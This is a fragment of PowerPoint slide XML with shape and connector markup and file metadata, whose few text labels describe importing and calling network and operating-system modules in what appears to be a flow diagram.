          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4493238" y="1969314"/>
            <a:ext cx="1397233" cy="393344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halkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>use</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Chalkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:latin typeface="Chalkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>network module call</a:t>
            </a:r>
            <a:endParaRPr lang="en-CN" sz="1200" dirty="0">
              <a:latin typeface="Chalkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p: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E59DCE99-1AA0-E11A-44AF-B027F98754D0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipV="1">
            <a:off x="4067279" y="2362657"/>
            <a:ext cx="1157541" cy="176534"/>
          </a:xfrm>
          <a:prstGeom prst="curved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圆角矩形 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7905D1C0-BF2D-626E-1C62-26D35EB07290}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6290581" y="4761230"/>
            <a:ext cx="3756988" cy="192680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1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="圆角矩形 13">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{77D9A14D-56E4-5D57-0FBF-E5002468E2B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6290581" y="5131344"/>
            <a:ext cx="3935303" cy="192679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1"/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D7FA4532-E993-DC05-957B-0961D23E16D8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="45" idx="2"/>
            <a:endCxn id="5" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="9962251" y="4073152"/>
            <a:ext cx="869736" cy="699100"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector2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293DE928-9658-522F-D22D-FA7526A8C2D4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="45" idx="2"/>
            <a:endCxn id="19" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="9866352" y="4347367"/>
            <a:ext cx="1239850" cy="520785"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector2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A45DE4F-B3CC-FDF1-0F78-300E5EEDE07D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4218418" y="1131746"/>
            <a:ext cx="1397233" cy="393344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halkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>import network module</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="圆角矩形 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1049E055-B7A6-701C-784F-9C7F5C508210}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782203" y="919399"/>
            <a:ext cx="3283956" cy="183844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1"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="圆角矩形 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C0BAB363-DA32-8FE2-A90E-B895D850F0B3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6290580" y="743836"/>
            <a:ext cx="3283956" cy="153907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1"/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B12EF059-029F-55A1-F1E5-858F7FA2496E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="3" idx="0"/>
            <a:endCxn id="23" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="16200000" flipV="1">
            <a:off x="4431385" y="646096"/>
            <a:ext cx="120425" cy="850876"/>
          </a:xfrm>
          <a:prstGeom prst="curvedConnector2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C320E755-686D-D98F-CEB4-457435DC82F7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="3" idx="3"/>
            <a:endCxn id="26" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5615651" y="820790"/>
            <a:ext cx="674929" cy="507628"/>
          </a:xfrm>
          <a:prstGeom prst="curved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圆角矩形 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01A4B9A2-4C1D-0DD6-02BD-D3BB6B9C4674}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="722733" y="3850573"/>
            <a:ext cx="3301271" cy="354242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1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94043F6-5E01-B065-F1EE-389A839A36BA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4284827" y="3601933"/>
            <a:ext cx="1397233" cy="602881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halkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>use operating system module call </a:t>
            </a:r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F8DF6C39-E1C2-0C10-F3E4-4C75A6DD01A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="32" idx="1"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000" flipV="1">
            <a:off x="4024009" y="3903374"/>
            <a:ext cx="260819" cy="135994"/>
          </a:xfrm>
          <a:prstGeom prst="curved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D11DC28-5579-F5F4-A7A6-BBC69BDD8E20}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1706723" y="358760"/>
            <a:ext cx="1762034" cy="393344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halkboard" panose="03050602040202020205" pitchFamily="66" charset="77"/>
              </a:rPr>
              <a:t>import operating system module</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="47" name="圆角矩形 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC6F0B6A-471E-8C48-6405-6EE273D8BE6B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="308023" y="365077"/>
            <a:ext cx="1043699" cy="181668"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 0"/>
            </a:avLst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1"/>
          </a:p>
        </p:txBody>
      </p:sp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15588BA5-69BB-D5D3-AABF-099EA8E9A4A2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvCxnSpPr>
            <a:cxnSpLocks/>
            <a:stCxn id="44" idx="1"/>
            <a:endCxn id="47" idx="3"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm rot="10800000">
            <a:off x="1351723" y="455912"/>
            <a:ext cx="355001" cy="99521"/>
          </a:xfrm>
          <a:prstGeom prst="curved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443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</TotalTime>
  <Words>579</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>Widescreen</PresentationFormat>
  <Paragraphs>124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Arial</vt:lpstr>
      <vt:lpstr>Chalkboard</vt:lpstr>
      <vt:lpstr>Courier</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Times New Roman</vt:lpstr>
      <vt:lpstr>Office 主题​​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峻安 张</dc:creator>
  <cp:lastModifiedBy>Huang Kaifeng</cp:lastModifiedBy>
  <cp:revision>115</cp:revision>
  <cp:lastPrinted>2023-04-10T03:38:56Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2023-04-10T02:45:49Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-06-06T06:46:04Z</dcterms:modified>
</cp:coreProperties>
</file>